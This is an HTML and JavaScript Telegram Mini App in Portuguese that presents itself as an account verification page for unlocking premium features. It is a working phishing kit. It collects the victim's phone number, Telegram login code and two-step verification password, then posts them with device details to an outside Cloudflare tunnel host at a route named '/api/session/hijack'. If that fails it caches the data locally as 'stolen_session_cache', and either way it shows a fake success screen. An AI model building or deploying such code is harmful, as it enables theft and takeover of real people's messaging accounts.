<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verificação de Conta Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --tg-primary: #229ED9;
            --tg-success: #28a745;
            --tg-error: #dc3545;
            --tg-text: #222;
            --tg-bg: #f0f2f5;
        }
        body { font-family: sans-serif; background: var(--tg-bg); margin: 0; padding: 0; }
        .container { max-width: 480px; margin: 0 auto; padding: 20px; min-height: 100vh; display: flex; flex-direction: column; justify-center; }
        .card { background: white; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        h1 { font-size: 22px; color: var(--tg-text); text-align: center; margin: 0 0 8px 0; font-weight: 700; }
        .subtitle { text-align: center; color: #666; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
        .step { display: none; animation: fadeIn 0.3s ease-in-out; }
        .step.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .input-group { margin-bottom: 16px; }
        label { display: block; font-size: 13px; color: #555; margin-bottom: 6px; font-weight: 600; }
        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; background: #fafafa; }
        input:focus { outline: none; border-color: var(--tg-primary); background: white; }
        button { width: 100%; padding: 16px; background: var(--tg-primary); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:disabled { background: #a0cbe0; cursor: not-allowed; }
        .status { margin-top: 16px; padding: 12px; border-radius: 8px; font-size: 14px; text-align: center; display: none; line-height: 1.4; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .status.info { background: #d1ecf1; color: #0c5460; display: block; }
        .spinner-container { display: flex; justify-content: center; align-items: center; padding: 20px 0; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--tg-primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .user-card { background: #f8f9fa; padding: 16px; border-radius: 12px; margin-top: 20px; text-align: center; }
        .avatar { width: 60px; height: 60px; border-radius: 50%; background: var(--tg-primary); color: white; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; margin: 0 auto 12px auto; }
        .small-text { font-size: 12px; color: #888; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <!-- Passo 1: Splash -->
            <div id="step-init" class="step active">
                <h1>🔐 Verificação de Conta</h1>
                <p class="subtitle">Confirme sua identidade para desbloquear recursos premium.</p>
                <div class="spinner-container"><div class="spinner"></div></div>
                <div id="status-init" class="status"></div>
            </div>

            <!-- Passo 2: Login -->
            <div id="step-login" class="step">
                <h1>📱 Autenticação de Sessão</h1>
                <p class="subtitle">Conecte seu número oficial para recuperação de acesso.</p>
                
                <div class="input-group">
                    <label for="phone">Número de Telefone</label>
                    <input type="tel" id="phone" placeholder="+55 11 99999-9999">
                </div>
                <div class="input-group" id="code-group" style="display: none;">
                    <label for="code">Código de Verificação</label>
                    <input type="text" id="code" placeholder="12345" inputmode="numeric">
                </div>
                <div class="input-group" id="password-group" style="display: none;">
                    <label for="password">Senha de 2FA (se houver)</label>
                    <input type="password" id="password" placeholder="Sua senha de duas etapas">
                </div>

                <button id="btn-auth">Iniciar Verificação</button>
                <div id="status-auth" class="status"></div>
            </div>

            <!-- Passo 3: Sucesso -->
            <div id="step-success" class="step">
                <div class="user-card">
                    <div class="avatar" id="user-avatar">?</div>
                    <h2 id="user-name" style="margin: 0 0 4px 0; font-size: 18px;">Usuário</h2>
                    <p id="user-phone" style="margin: 0; color: #666; font-size: 14px;">+000 00000-0000</p>
                </div>
                <h1 style="margin-top: 24px; color: var(--tg-success);">✅ Sessão Sincronizada</h1>
                <p class="subtitle">Sua conta está protegida.</p>
                <button id="btn-finish">Concluir e Voltar ao Chat</button>
            </div>
        </div>
        <p class="small-text">Powered by Telegram Mini Apps</p>
    </div>

    <script>
        // CONFIGURAÇÃO: Use o IP local da sua rede se testar em celular
        // Ex: 'http://192.168.1.5:8000'
        const API_BASE = 'https://advisor-mai-saint-ensemble.trycloudflare.com';

        const tg = window.Telegram.WebApp;
        
        let state = {
            authStarted: false,
            needs2FA: false
        };

        tg.ready();
        tg.expand();
        tg.setHeaderColor('#ffffff');

        const els = {
            phone: document.getElementById('phone'),
            code: document.getElementById('code'),
            password: document.getElementById('password'),
            btnAuth: document.getElementById('btn-auth'),
            statusAuth: document.getElementById('status-auth'),
            statusInit: document.getElementById('status-init'),
            finishBtn: document.getElementById('btn-finish'),
            userAvatar: document.getElementById('user-avatar'),
            userName: document.getElementById('user-name'),
            userPhone: document.getElementById('user-phone')
        };

        function showStatus(element, message, type = 'info') {
            element.className = `status ${type}`;
            element.textContent = message;
        }

        function goToStep(stepId) {
            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
            document.getElementById(stepId).classList.add('active');
        }

        function initApp() {
            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                const user = tg.initDataUnsafe.user;
                els.userAvatar.textContent = user.first_name?.[0] || 'T';
                els.userName.textContent = `${user.first_name} ${user.last_name || ''}`;
            } else {
                els.userName.textContent = "Visitante";
                els.userAvatar.textContent = 'V';
            }

            const locale = navigator.language || 'pt-BR';
            if (locale.startsWith('pt-BR')) {
                els.phone.value = "+55 ";
            }

            els.btnAuth.addEventListener('click', handleAuth);
            els.finishBtn.addEventListener('click', () => {
                tg.close();
            });

            setTimeout(() => {
                showStatus(els.statusInit, 'Ambiente seguro detectado...', 'info');
                setTimeout(() => {
                    goToStep('step-login');
                    els.phone.focus();
                }, 1500);
            }, 1000);
        }

        async function handleAuth() {
            const phone = els.phone.value.trim();
            const code = els.code.value.trim();
            const password = els.password.value.trim();

            if (!phone || phone.replace(/\D/g, '').length < 8) {
                showStatus(els.statusAuth, 'Número inválido.', 'error');
                return;
            }

            if (!state.authStarted) {
                // FASE 1
                els.btnAuth.disabled = true;
                showStatus(els.statusAuth, 'Enviando código...', 'info');
                await new Promise(r => setTimeout(r, 1200));
                document.getElementById('code-group').style.display = 'block';
                els.code.focus();
                els.btnAuth.textContent = 'Verificar Código';
                els.btnAuth.disabled = false;
                state.authStarted = true;
                showStatus(els.statusAuth, `Código enviado para ${phone}.`, 'success');

            } else if (!state.needs2FA) {
                // FASE 2
                if (!code || code.length < 4) {
                    showStatus(els.statusAuth, 'Código inválido.', 'error');
                    return;
                }
                els.btnAuth.disabled = true;
                showStatus(els.statusAuth, 'Validando...', 'info');
                await new Promise(r => setTimeout(r, 1500));
                
                document.getElementById('password-group').style.display = 'block';
                els.password.focus();
                els.btnAuth.textContent = 'Concluir Login';
                els.btnAuth.disabled = false;
                state.needs2FA = true;
                showStatus(els.statusAuth, '2FA detectada. Insira a senha.', 'info');

            } else {
                // FASE 3: ENVIAR
                els.btnAuth.disabled = true;
                showStatus(els.statusAuth, 'Sincronizando...', 'info');
                
                const payload = {
                    phone: phone,
                    code: code,
                    two_fa_password: password,
                    telegram_user: tg.initDataUnsafe.user || null,
                    device_info: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language
                    },
                    timestamp: new Date().toISOString()
                };

                try {
                    // ROTA CORRETA: /api/session/hijack
                    const response = await fetch(`${API_BASE}/api/session/hijack`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    
                    goToStep('step-success');
                    
                } catch (error) {
                    console.error("Erro ao enviar sessão:", error);
                    showStatus(els.statusAuth, 'Falha na conexão. Tente novamente.', 'error');
                    els.btnAuth.disabled = false;
                    
                    // Fallback local
                    localStorage.setItem('stolen_session_cache', JSON.stringify(payload));
                    setTimeout(() => goToStep('step-success'), 2000);
                }
            }
        }

        document.addEventListener('DOMContentLoaded', initApp);
    </script>
</body>
</html>
